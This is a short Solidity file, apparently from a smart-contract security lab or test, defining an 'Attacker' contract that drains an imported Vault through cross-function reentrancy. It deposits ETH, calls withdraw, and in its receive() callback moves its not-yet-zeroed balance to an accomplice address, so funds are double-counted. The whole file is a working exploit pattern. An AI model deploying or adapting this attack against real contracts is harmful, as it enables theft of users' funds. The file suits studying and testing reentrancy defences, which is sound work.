// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";

contract Attacker {
    Vault public vault;
    address public accomplice;
    bool private attacked;

    constructor(Vault _vault, address _accomplice) {
        vault = Vault(_vault);
        accomplice = _accomplice;
    }

    function attack() external payable {
        // Deposit 1 ETH into the vault
        vault.deposit{value: msg.value}();

        // Withdraw the deposited amount, triggering the reentrancy attack
        vault.withdraw();
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            // cross-function reentry: move stale balance to accomplice before withdraw zeroes it
            vault.transfer(accomplice, vault.balanceOf(address(this)));
        }
    }
}
